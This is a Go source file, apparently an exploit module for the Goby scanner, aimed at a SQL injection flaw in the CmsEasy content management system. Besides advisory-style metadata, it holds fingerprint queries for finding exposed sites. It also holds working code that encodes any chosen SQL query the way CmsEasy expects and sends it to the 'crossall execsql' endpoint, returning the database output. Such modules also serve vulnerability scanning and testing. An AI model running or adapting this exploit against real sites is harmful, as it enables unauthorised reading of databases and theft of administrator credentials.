package exploits

import (
	"crypto/md5"
	"encoding/base64"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
)

func init() {
	expJson := `{
    "Name": "CmsEasy crossall_act.php sqli",
    "Description": "<p>CmsEasy is a website content management system based on PHP Mysql architecture, and it is also a PHP development platform.</p><p>CmsEasy has a SQL injection vulnerability, which can be exploited by attackers to obtain sensitive information in the database.</p>",
    "Impact": "CmsEasy crossall_act.php sqli",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.cmseasy.cn/\">https://www.cmseasy.cn/</a></p><p>1. Deploy a web application firewall to monitor database operations.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "Product": "CmsEasy",
    "VulType": [
        "SQL Injection"
    ],
    "Tags": [
        "SQL Injection"
    ],
    "Translation": {
        "CN": {
            "Name": "CmsEasy 内容管理系统 crossall_act.php 文件 SQL 注入漏洞",
            "Description": "<p>CmsEasy是一款基于PHP Mysql架构的网站内容管理系统，也是一个PHP开发平台。</p><p>CmsEasy存在SQL注入漏洞，攻击者可利用该漏洞获取数据库敏感信息，如数据库名、密码等，利用这些信息登录到系统后台。</p>",
            "Impact": "<p>CmsEasy存在SQL注入漏洞，攻击者可利用该漏洞获取数据库敏感信息，如数据库名、密码等，利用这些信息登录到系统后台。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新： <a href=\"https://www.cmseasy.cn/\">https://www.cmseasy.cn/</a></p><p>1、部署Web应⽤防⽕墙，对数据库操作进⾏监控。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "CmsEasy",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "CmsEasy crossall_act.php sqli",
            "Description": "<p>CmsEasy is a website content management system based on PHP Mysql architecture, and it is also a PHP development platform.</p><p>CmsEasy has a SQL injection vulnerability, which can be exploited by attackers to obtain sensitive information in the database.</p>",
            "Impact": "CmsEasy crossall_act.php sqli",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.cmseasy.cn/\">https://www.cmseasy.cn/</a></p><p>1. Deploy a web application firewall to monitor database operations.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
            "Product": "CmsEasy",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "FofaQuery": "(title=\"Powered by CmsEasy\" || header=\"http://www.cmseasy.cn/service_1.html\" || body=\"content=\\\"CmsEasy\")",
    "GobyQuery": "(title=\"Powered by CmsEasy\" || header=\"http://www.cmseasy.cn/service_1.html\" || body=\"content=\\\"CmsEasy\")",
    "Author": "1291904552@qq.com",
    "Homepage": "https://www.cmseasy.cn/",
    "DisclosureDate": "2021-09-22",
    "References": [
        "https://xz.aliyun.com/t/10259"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "8.5",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "sqlQuery",
            "type": "input",
            "value": "select user();",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [
            "CmsEasy"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10229"
}`

	SqlChange := func(sqlquery string) string {
		chars := "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-=+"
		nh := 2
		ch := string(chars[nh])
		mdKey := fmt.Sprintf("%x", md5.Sum([]byte("sql"+ch)))
		start := nh % 8
		end := nh%8 + 7
		mdKey = mdKey[start : start+end]
		txt := base64.StdEncoding.EncodeToString([]byte(sqlquery))
		var i, j, k int
		tmp := ""
		for i = 0; i < len(txt); i++ {
			if k == len(mdKey) {
				k = 0
			}
			j = (nh + strings.Index(chars, string(txt[i])) + int(string(mdKey[k])[0])) % 64
			tmp += string(chars[j])
			k = k + 1
		}
		return url.QueryEscape(ch + tmp)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/?case=crossall&act=execsql&sql=CErNh%3D-zvuuqcC4IXHJ0eGlln"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.RawBody, "202cb962ac59075b964b07152d234b70") && strings.Contains(resp.RawBody, "md5(123)")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["sqlQuery"].(string)
			sql := SqlChange(cmd)
			uri := "/?case=crossall&act=execsql&sql=" + sql
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					expResult.Output = resp.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
